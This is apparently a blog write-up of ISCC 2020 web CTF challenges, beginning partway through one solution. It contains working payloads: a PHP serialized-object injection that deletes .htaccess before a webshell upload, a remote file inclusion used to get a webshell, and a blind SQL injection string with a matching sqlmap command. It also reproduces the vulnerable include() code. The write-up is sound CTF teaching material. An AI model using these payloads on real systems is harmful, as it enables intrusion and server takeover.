<p><code>ZipArchive::open</code>的第一个参数是文件名，第二个参数是flags，而9对应的是<code>ZipArchive::CREATE | ZipArchive::OVERWRITE</code>。<code>ZipArchive::OVERWRITE</code>的意思是重写覆盖文件，这个操作会删除原来的文件。</p>
<p>因为UploadFile类的open函数的参数是fakename和realname，fakename对应.htaccess，realname对应flags，这里直接使用<code>ZipArchive::OVERWRITE</code>的integer值9，这样我们就可以使用ZipArchive-&gt;open()来删除<code>.htaccess</code>文件。</p>
<p><strong>分析编写payload</strong></p>
<p>先序列化一个ZipArchive类的对象：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$zip</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fakename</span> <span class="token operator">=</span> <span class="token string">"sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess"</span><span class="token punctuation">;</span>
<span class="token variable">$zip</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">realname</span> <span class="token operator">=</span> <span class="token string">"9"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$zip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

O<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"ZipArchive"</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"fakename"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">58</span><span class="token punctuation">:</span><span class="token string">"sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"realname"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"9"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"status"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"statusSys"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"numFiles"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"filename"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"comment"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后随便上传两个文件，查看cookie得到序列化的值</p>
<pre><code>a:2:{i:0;O:10:&quot;UploadFile&quot;:2:{s:8:&quot;fakename&quot;;s:9:&quot;pictu.jpg&quot;;s:8:&quot;realname&quot;;s:44:&quot;3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg&quot;;}i:1;O:10:&quot;UploadFile&quot;:2:{s:8:&quot;fakename&quot;;s:7:&quot;qwe.jpg&quot;;s:8:&quot;realname&quot;;s:44:&quot;75a9c6a2fcb5d7c6809ec7c1a5859a7f83637159.jpg&quot;;}}f96f37cca80ecae3c5f2f30be497c27024a23a24093e9e7a26c9721be025fb7b</code></pre><p>根据前面的探索利用，将第二个文件的fakename改成需要构造的ZipArchive的序列化值，如果想单独溢出注入ZipArchive对象，就需要将第二个文件对象中fakename值的前后部分都需要被溢出才行：</p>
<ul>
<li>后面部分：</li>
</ul>
<pre><code>&quot;;s:8:&quot;realname&quot;;s:44:&quot;75a9c6a2fcb5d7c6809ec7c1a5859a7f83637159.jpg</code></pre><p>67个无用字符，所以ZipArchive序列化对象中的comment的长度为67，部分构造如下：</p>
<pre><code>i:1;O:10:&quot;ZipArchive&quot;:7:{s:8:&quot;fakename&quot;;s:58:&quot;sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess&quot;;s:8:&quot;realname&quot;;s:1:&quot;9&quot;;s:6:&quot;status&quot;;i:0;s:9:&quot;statusSys&quot;;i:0;s:8:&quot;numFiles&quot;;i:0;s:8:&quot;filename&quot;;s:0:&quot;&quot;;s:7:&quot;comment&quot;;s:67:&quot;</code></pre><ul>
<li>前面部分：</li>
</ul>
<p>因为第一个文件对象中的fakename需要溢出到第二个文件的fakename值的位置，所以第二个文件对象的fakename值还需要加一部分：</p>
<pre><code>&quot;;s:8:&quot;realname&quot;;s:1:&quot;A&quot;;}</code></pre><p>PS：此处的realname内容是什么无所谓，主要是为了序列化的完整性</p>
<p>第二个文件对象最终的fakename值如下：</p>
<pre><code>&quot;;s:8:&quot;realname&quot;;s:1:&quot;A&quot;;}i:1;O:10:&quot;ZipArchive&quot;:7:{s:8:&quot;fakename&quot;;s:58:&quot;sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess&quot;;s:8:&quot;realname&quot;;s:1:&quot;9&quot;;s:6:&quot;status&quot;;i:0;s:9:&quot;statusSys&quot;;i:0;s:8:&quot;numFiles&quot;;i:0;s:8:&quot;filename&quot;;s:0:&quot;&quot;;s:7:&quot;comment&quot;;s:67:&quot;</code></pre><p>处理完第二个文件对象的fakename就需要处理第一个文件对象的fakename：</p>
<p>同时，要想ZipArchive对象成功溢出，就需要从第一个文件对象fakename值溢出到第二个文件对象的fakename值，所以第一个fakename值需要溢出的部分为：</p>
<pre><code>&quot;;s:8:&quot;realname&quot;;s:44:&quot;3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg&quot;;}i:1;O:10:&quot;UploadFile&quot;:2:{s:8:&quot;fakename&quot;;s:7:&quot;</code></pre><p>可是这样是不正确的，正确部分的应该是：</p>
<pre><code>&quot;;s:8:&quot;realname&quot;;s:44:&quot;3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg&quot;;}i:1;O:10:&quot;UploadFile&quot;:2:{s:8:&quot;fakename&quot;;s:253:&quot;</code></pre><p>因为我们必须先修改第二个对象的fakename值，然后才能依据重新反序列化的Cooke[files]修改第一个的fakename，而此时的第二个fakename长度已经改变，不再是7，所以这部分溢出的长度为117，因此第一个文件的fakename值就是117个<code>../</code>。</p>
<pre><code>../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../</code></pre><p><strong>最终payload</strong></p>
<p>依据上述的分析，先修改第二个文件对象的fakename然后再修改第一个文件对象的fakename(不能互换！！！)</p>
<p>第二个文件对象的fakename:</p>
<pre><code>&quot;;s:8:&quot;realname&quot;;s:1:&quot;A&quot;;}i:1;O:10:&quot;ZipArchive&quot;:7:{s:8:&quot;fakename&quot;;s:58:&quot;sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess&quot;;s:8:&quot;realname&quot;;s:1:&quot;9&quot;;s:6:&quot;status&quot;;i:0;s:9:&quot;statusSys&quot;;i:0;s:8:&quot;numFiles&quot;;i:0;s:8:&quot;filename&quot;;s:0:&quot;&quot;;s:7:&quot;comment&quot;;s:67:&quot;</code></pre><p>第一个文件对象的fakename:</p>
<pre><code>../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../</code></pre><p>修改伪造之后成功伪造引入非法对象的Cookie</p>
<pre><code>a:2:{i:0;O:10:&quot;UploadFile&quot;:2:{s:8:&quot;fakename&quot;;s:351:&quot;./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././&quot;;s:8:&quot;realname&quot;;s:44:&quot;3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg&quot;;}i:1;O:10:&quot;UploadFile&quot;:2:{s:8:&quot;fakename&quot;;s:253:&quot;&quot;;s:8:&quot;realname&quot;;s:1:&quot;A&quot;;}i:1;O:10:&quot;ZipArchive&quot;:7:{s:8:&quot;fakename&quot;;s:58:&quot;sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess&quot;;s:8:&quot;realname&quot;;s:1:&quot;9&quot;;s:6:&quot;status&quot;;i:0;s:9:&quot;statusSys&quot;;i:0;s:8:&quot;numFiles&quot;;i:0;s:8:&quot;filename&quot;;s:0:&quot;&quot;;s:7:&quot;comment&quot;;s:67:&quot;&quot;;s:8:&quot;realname&quot;;s:44:&quot;75a9c6a2fcb5d7c6809ec7c1a5859a7f83637159.jpg&quot;;}}cc2ffa6941ffc8895e4c029f62046ab7963af6ec9e5061103d71a295834b388b</code></pre><p>查看非法对象Cookie中files的文件对象数组</p>
<pre><code>php &gt; print_r(unserialize($X));
Array 
(   
    [0] =&gt; __PHP_Incomplete_Class Object 
        (  
            [__PHP_Incomplete_Class_Name] =&gt; UploadFile   
            [fakename] =&gt; ./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././&quot;;s:8:&quot;realname&quot;;s:44:&quot;3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg&quot;;}i:1;O:10:&quot;UploadFile&quot;:2:{s:8:&quot;fakename&quot;;s:253:&quot; 
            [realname] =&gt; A     
        )        
    [1] =&gt; ZipArchive Object
        ( 
            [status] =&gt; 0   
            [statusSys] =&gt; 0  
            [numFiles] =&gt; 0     
            [filename] =&gt; 
            [comment] =&gt; 
            [fakename] =&gt; sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess
            [realname] =&gt; 9   
        )  
)</code></pre><p>最后访问<code>index.php?action=open&amp;i=1</code>，服务器直接操作files数组中i=1索引的对象执行open()方法，即ZipArchive的open函数，删除<code>.htaccess</code>文件。</p>
<p>之后，直接上传webshell拿到服务器权限</p>
<pre><code>shell.php is in folder sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/cf9c5d4cdaab48d9872f7029d1cd642431e58193.php</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200524140946934.png" alt="image-20200524140946934"></p>
<pre><code>flag{ghs_aswoer_nmxld}</code></pre><h2 id="Where-is-file"><a href="#Where-is-file" class="headerlink" title="Where is file?"></a>Where is file?</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200507234337368.png" alt="image-20200507234337368"></p>
<p>考点：文件包含</p>
<p>题目源码直接给了</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> "file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//")) {</span>
    <span class="token variable">$file</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span>"file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//", "", $file);</span>
<span class="token punctuation">}</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>代码审计<code>file</code>变量用户可控存在文件包含漏洞</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200507234830391.png" alt="image-20200507234830391"></p>
<p>测试发现本地文件包含漏洞无法进行恶意利用（服务器访问日志、SSH日志等无法直接访问包含），直接猜测测试是否存在远程文件包含漏洞（随便找一个其他题目链接，意外发现成功包含【第一次CTF遇见远程文件包含。。。。尴尬。。。】）</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200507235424156.png" alt="image-20200507235424156"></p>
<p>到这里不用说了，直接远程包含恶意文件拿到Webshell</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200507235643454.png" alt="image-20200507235643454"></p>
<p>这里也可以查看服务器的php.ini配置</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200507234637957.png" alt="image-20200507234637957"></p>
<pre><code>flag{web_include_file}</code></pre><h2 id="成绩查询-2"><a href="#成绩查询-2" class="headerlink" title="成绩查询-2"></a>成绩查询-2</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200513090803813.png" alt="image-20200513090803813"></p>
<p>考点：敏感信息收集、SQL注入</p>
<p>题目打开之后是一个登陆界面</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521112053200.png" alt="image-20200521112053200"></p>
<p>测试查看任意账户密码登录回显信息（不管用户名、密码是什么都会报错：<code>password is error！</code>）</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521174715852.png" alt="image-20200521174715852"></p>
<p>简单注入<code>username</code>和<code>password</code>无果，到这里先不再继续注入，寻找网站是否存在其它的敏感信息泄露</p>
<p>收集网站敏感信息，发现存在特殊目录和文件的泄露</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521111107265.png" alt="image-20200521111107265"></p>
<p><code>inc</code>目录存放的是配置文件和功能函数文件</p>
<pre><code>Index of /inc
[ICO]    Name    Last modified    Size    Description
[PARENTDIR]    Parent Directory         -     
[   ]    config.inc.php    2020-05-11 01:59    697     
[   ]    function.php    2020-04-28 12:44    7.1K     
[   ]    mysql.inc.php    2020-05-07 02:46    1.0K     
Apache/2.4.29 (Ubuntu) Server at 101.201.126.95 Port 7007</code></pre><p>接着访问<code>flag.php</code>，发现存在跳转，使用bp拦截数据包</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521175708209.png" alt="image-20200521175708209"></p>
<p>根据返回的数据包提示注入字段<code>name</code></p>
<p>经过注入测试发现存在时间盲注，但是过滤了空格（这里使用注释符绕过）</p>
<p>payload（这里禁用JS之后再进行测试，避免跳转到index.php界面）</p>
<pre><code>1&#39;/**/AND/**/(SELECT/**/6/**/FROM/**/(SELECT(SLEEP(5)))B)#</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521221417857.png" alt="image-20200521221417857"></p>
<p>知道注入规则之后，直接使用SQLMAP添加tamper脚本进行自动化攻击利用</p>
<pre><code>sqlmap -u &quot;http://101.201.126.95:7007/flag.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --tamper=space2comment -D pikachu -T flag -C &quot;flag&quot; --dump</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521221631489.png" alt="image-20200521221631489"></p>
<p>得到MD5进行解密</p>
<pre><code>ciphertext：67d4e5f7ee18967a612a5eb8dcda020a

plaintext：sixsixsix

flag{sixsixsix}</code></pre><h2 id="成绩查询-3"><a href="#成绩查询-3" class="headerlink" title="成绩查询-3"></a>成绩查询-3</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200515230224285.png" alt="image-20200515230224285"></p>
<p>考点：密码算法</p>
<p>题目打开如下</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200520234258267.png" alt="image-20200520234258267"></p>
<p>可以看到这是一串base64编码的字符串，但是解码之后是乱码</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200520234448930.png" alt="image-20200520234448930"></p>
<p>可以猜测该字符串在base64编码之前可能进行过其它算法的的处理（一般算法加密的数据最后都会进行base64编码存储，避免特殊字符的影响），下来对网站进行敏感信息的收集，发现并未存在其它目录文件的泄露，但是网站主页的源代码里存在注释的源码敏感信息</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200520234748791.png" alt="image-20200520234748791"></p>
<p>从代码可以看出这是一个加密算法，也就验证了主页显示的一串字符串正是由该算法加密处理后的结果。</p>
<p>既然知道了加密算法，就可以很容易的推出解密算法来，但是要想解密这段特殊字符串必须知道密钥key，由于前面的敏感信息收集并没有发现key的泄露，所以根据题目的关联性，回到上一关<code>ISCC成绩查询_2</code>（一般上一关flag会是下一关解题的一部分）寻找是否存在key，因为上一关注入得到的flag为<code>flag{sixsixsix}</code>，所以猜测key可能取值为<code>sixsixsix 或 666</code>，知道密钥key之后剩下的就是由加密算法编写解密算法，解密算法如下：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">function</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">.</span><span class="token variable">$key</span><span class="token punctuation">.</span><span class="token string">'：'</span><span class="token punctuation">;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">md5</span> <span class="token punctuation">(</span> <span class="token variable">$key</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">base64_decode</span> <span class="token punctuation">(</span> <span class="token variable">$data</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">strlen</span> <span class="token punctuation">(</span> <span class="token variable">$data</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$l</span> <span class="token operator">=</span> <span class="token function">strlen</span> <span class="token punctuation">(</span> <span class="token variable">$key</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">==</span> <span class="token variable">$l</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$char</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">substr</span> <span class="token punctuation">(</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$x</span> <span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span> <span class="token punctuation">(</span> <span class="token function">substr</span> <span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">ord</span> <span class="token punctuation">(</span> <span class="token function">substr</span> <span class="token punctuation">(</span> <span class="token variable">$char</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">ord</span> <span class="token punctuation">(</span> <span class="token function">substr</span> <span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">ord</span> <span class="token punctuation">(</span> <span class="token function">substr</span> <span class="token punctuation">(</span> <span class="token variable">$char</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span> <span class="token punctuation">(</span> <span class="token function">ord</span> <span class="token punctuation">(</span> <span class="token function">substr</span> <span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">ord</span> <span class="token punctuation">(</span> <span class="token function">substr</span> <span class="token punctuation">(</span> <span class="token variable">$char</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token string">"sixsixsix"</span><span class="token punctuation">;</span>
<span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token string">"666"</span><span class="token punctuation">;</span>

<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token string">"qKe4j6uFeqaTe5rVqqaXiKig25o="</span><span class="token punctuation">;</span>

<span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$key1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>解密数据<code>qKe4j6uFeqaTe5rVqqaXiKig25o=</code></p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521000848535.png" alt="image-20200521000848535"></p>
<p>从结果可以看到密钥key为<code>666</code>，解密结果为<code>BFS_ISCC_First_Prize</code></p>
<pre><code>flag{BFS_ISCC_First_Prize}</code></pre><h2 id="神秘组织的邮件-2"><a href="#神秘组织的邮件-2" class="headerlink" title="神秘组织的邮件-2"></a>神秘组织的邮件-2</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200515230121671.png" alt="image-20200515230121671"></p>
<p>考点：脚本编写、代码审计</p>
<p>题目打开有一串数字字符还有一个提交按钮</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200525183757391.png" alt="image-20200525183757391"></p>
<p>看数字和Result提交，猜测是计算上面的四个数然后提交结果，但是应该是什么样的四则运算呢？？依据上一题<code>神秘组织的邮件-1</code>解出的flag提示进行解题：<code>flag{加减乘除}</code></p>
<p>知道表达式的运算规则之后，编写脚本进行测试利用</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> re
<span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token string">'http://101.201.126.95:7010/index.php'</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
text <span class="token operator">=</span> r<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text
calc <span class="token operator">=</span> str<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'(.*?)&lt;form action="result.php" method="post">'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>
<span class="token comment" spellcheck="true">#print(text)</span>
<span class="token comment" spellcheck="true">#print(calc)</span>
s1 <span class="token operator">=</span> calc<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'  '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
s2 <span class="token operator">=</span> s1<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'  '</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
s3 <span class="token operator">=</span> s2<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'  '</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
s4 <span class="token operator">=</span> s3<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'  '</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span>
ans <span class="token operator">=</span> eval<span class="token punctuation">(</span>s4<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'result'</span><span class="token punctuation">:</span>ans<span class="token punctuation">,</span> <span class="token string">'submit'</span><span class="token punctuation">:</span><span class="token string">'提交'</span><span class="token punctuation">}</span>
url1 <span class="token operator">=</span> <span class="token string">'http://101.201.126.95:7010/result.php'</span>
res <span class="token operator">=</span> r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行脚本得到页面的其它回显信息</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200525222556450.png" alt="image-20200525222556450"></p>
<pre class="line-numbers language-html"><code class="language-html">34685+95037-7*786/2
126971.0

<span class="token doctype">&lt;!DOCTYPE html></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>download<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
